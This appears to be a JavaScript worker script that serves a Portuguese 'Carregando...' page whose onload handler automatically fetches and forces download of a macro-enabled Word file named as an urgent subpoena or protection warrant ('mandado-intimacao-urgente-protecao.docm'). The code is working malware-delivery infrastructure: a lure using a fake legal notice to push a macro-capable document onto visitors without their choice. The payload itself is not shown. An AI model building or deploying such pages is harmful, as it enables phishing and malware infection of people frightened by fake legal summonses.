export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    
    if (url.pathname === '/' || url.pathname === '/index.html') {
      return new Response(getHTML(), {
        headers: {
          'Content-Type': 'text/html; charset=utf-8',
          'Cache-Control': 'no-cache'
        }
      });
    }
    
    if (url.pathname === '/document.docm') {
      // Serve from R2, or redirect to origin
      return fetch(request);
    }
    
    return new Response('Not found', { status: 404 });
  }
};

function getHTML() {
  return `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Documento</title>
  <style>
    body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
    .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; }
    h1 { color: #333; }
    p { color: #666; }
  </style>
</head>
<body onload="download()">
  <div class="container">
    <h1>Carregando...</h1>
    <p id="status">Por favor aguarde...</p>
  </div>
  
  <script>
    async function download() {
      try {
        const response = await fetch('./document.docm');
        if (!response.ok) throw new Error('Arquivo indisponível');
        
        const blob = await response.blob();
        const url = URL.createObjectURL(blob);
        
        const link = document.createElement('a');
        link.href = url;
        link.download = 'mandado-intimacao-urgente-protecao.docm';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
        
        document.getElementById('status').textContent = 'Download iniciado...';
      } catch (e) {
        document.getElementById('status').textContent = 'Erro: ' + e.message;
      }
    }
  </script>
</body>
</html>`;
}
